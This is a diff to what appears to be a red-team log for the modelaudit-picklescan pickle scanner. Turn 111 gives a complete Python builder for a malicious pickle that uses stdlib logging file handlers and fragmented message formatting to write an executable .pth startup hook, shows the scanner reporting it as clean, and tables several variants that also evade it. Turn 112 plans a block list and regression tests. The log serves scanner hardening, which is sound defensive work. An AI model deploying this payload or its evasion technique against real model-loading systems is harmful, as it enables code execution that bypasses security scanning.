@@ -5922,3 +5922,179 @@ Blocking plan:
 Performance note: eight exact entries in the existing sorted dangerous-global
 table and no file-handle state tracking, argument-mode inspection, or broad
 `pathlib`/`io` wildcard module block.
+
+## Turn 111 - Logging file-handler startup-hook write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib logging file
+handlers as clean file writers and logging message formatting to assemble an
+executable startup hook at runtime.
+
+Candidate payload:
+
+- Construct a `logging.FileHandler` targeting an attacker-controlled `.pth`
+  file path.
+- Construct a `logging.LogRecord` whose `msg` is `%s%s%s%s` and whose `args`
+  are harmless-looking fragments:
+  `"im"`, `"port pathlib;pathlib.Path("`, `repr(marker_path)`, and
+  `").write_text('owned-by-logging-pth')"`.
+- Call `logging.Handler.handle(handler, record)` during unpickling. Logging
+  dispatches through the handler, formats the fragments into one line, and
+  writes the executable `.pth` file.
+- Normal Python site processing later executes that `.pth` line and writes the
+  marker file.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def tuple_for(args: list[bytes]) -> bytes:
+    if len(args) == 1:
+        return args[0] + b"\x85"
+    if len(args) == 2:
+        return args[0] + args[1] + b"\x86"
+    return b"(" + b"".join(args) + b"t"
+
+
+pth_path = Path("/tmp/ma_logging_exec.pth")
+marker = Path("/tmp/ma_logging_pth_marker")
+args = tuple_for(
+    [
+        text("im"),
+        text("port pathlib;pathlib.Path("),
+        text(repr(str(marker))),
+        text(").write_text('owned-by-logging-pth')"),
+    ]
+)
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("logging", "FileHandler"),
+        tuple_for([text(str(pth_path)), text("w")]),
+        b"R\x94",
+        sg("logging", "LogRecord"),
+        b"(",
+        text("picklescan"),
+        b"K\x14",
+        text("model.pkl"),
+        b"K\x01",
+        text("%s%s%s%s"),
+        args,
+        b"N",
+        b"tR\x94",
+        sg("logging", "Handler.handle"),
+        b"h\x00h\x01\x86R0",
+        sg("logging", "Handler.close"),
+        b"h\x00\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `len=421`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Coverage: `bytes_scanned=421`, `bytes_total=421`, `opcode_count=43`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `logging.FileHandler`, `logging.LogRecord`,
+  `logging.Handler.handle`, and `logging.Handler.close`, all with
+  `is_dangerous=False`
+- String heuristic matches: `[]`
+- Before unpickle: neither the `.pth` file nor marker exists
+- After `pickle.loads(payload)`: the `.pth` file exists and contains
+  `import pathlib;pathlib.Path('/tmp/.../ma_logging_pth_marker').write_text('owned-by-logging-pth')`;
+  the marker does not exist yet
+- After normal `site.addsitedir(tmp_dir)`: the marker exists and contains
+  `owned-by-logging-pth`
+
+Sibling dispatch proof:
+
+| Helper sequence | Scanner verdict | Runtime result |
+| --- | --- | --- |
+| `logging.FileHandler(path, "w")` plus `logging.FileHandler.emit(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text |
+| `logging.FileHandler(path, "w")` plus `logging.StreamHandler.emit(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text |
+| `logging.FileHandler(path, "w")` plus `logging.Handler.handle(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text through logging dispatch |
+| `logging.handlers.WatchedFileHandler(path, "w")` plus `logging.StreamHandler.emit(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text |
+| `logging.handlers.RotatingFileHandler(path, "w")` plus `logging.StreamHandler.emit(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text |
+| `logging.handlers.TimedRotatingFileHandler(path)` plus `logging.StreamHandler.emit(handler, record)` | clean, 0 findings, 0 notices | file created with attacker text |
+
+RCE mechanism:
+
+- Logging file handlers open attacker-selected paths internally, without any
+  pickle reference to `builtins.open`, `io.open`, `_io.open`, or
+  `pathlib.Path.write_text`.
+- `LogRecord.getMessage()` performs percent-formatting at emit time, so the
+  pickle can split the `.pth` executable line across benign-looking string
+  fragments and avoid literal `import` statement detection.
+- `Handler.handle()` is especially dangerous because it is a clean base-class
+  dispatch point; it calls the concrete handler's `emit()` method dynamically.
+- Writing a `.pth` file, `sitecustomize.py`, package init, shell config, or
+  service config in a writable loader path can turn the arbitrary log write
+  into code execution in the model-loading environment.
+
+Why the scanner missed it:
+
+- `logging` is not a wildcard-dangerous module; only
+  `logging.Filterer.filter` is listed today.
+- `logging.FileHandler`, `logging.StreamHandler.emit`,
+  `logging.FileHandler.emit`, `logging.Handler.handle`,
+  `logging.handlers.WatchedFileHandler`,
+  `logging.handlers.RotatingFileHandler`, and
+  `logging.handlers.TimedRotatingFileHandler` are absent from
+  `DANGEROUS_GLOBALS`.
+- The payload contains no blocked file API globals and no suspicious magic
+  method names.
+- The executable `import` statement does not appear as a single pickle string;
+  it is assembled by logging's own message formatting during unpickling.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for logging's file-writing constructors and clean dispatch drivers:
+`logging.FileHandler`, `logging.FileHandler.emit`,
+`logging.StreamHandler.emit`, `logging.Handler.handle`,
+`logging.handlers.WatchedFileHandler`,
+`logging.handlers.RotatingFileHandler`, and
+`logging.handlers.TimedRotatingFileHandler`. This keeps the hot path to sorted
+table lookups and avoids logging-object state tracking, formatter simulation,
+or broad `logging` wildcard blocking. `logging.LogRecord` and
+`logging.Handler.close` can stay allowed because they are not write sinks by
+themselves.
+
+## Turn 112 - Block logging file-handler write dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for logging file-writing constructors and
+  dispatch methods:
+  `logging.FileHandler`, `logging.FileHandler.emit`,
+  `logging.StreamHandler.emit`, `logging.Handler.handle`,
+  `logging.handlers.WatchedFileHandler`,
+  `logging.handlers.RotatingFileHandler`, and
+  `logging.handlers.TimedRotatingFileHandler`.
+- Leave `logging.LogRecord` and `logging.Handler.close` allowed. A record by
+  itself is inert, and close only releases a handler that has already been
+  opened or written through another blocked sink.
+- Add a CPython oracle regression for the Turn 111 sibling matrix. The
+  constructor-only controls are now malicious because logging file handlers
+  open attacker-selected paths as a side effect even before `emit()` runs.
+- Add a focused fragmented `.pth` regression. The test verifies the scanner
+  marks the payload malicious through logging globals, then verifies
+  `pickle.loads()` writes the `.pth` file and normal `site.addsitedir()` runs
+  the startup hook.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: seven exact entries in the existing sorted policy table and
+no logging formatter simulation, handler state tracking, path argument
+inspection, or broad `logging` wildcard block.
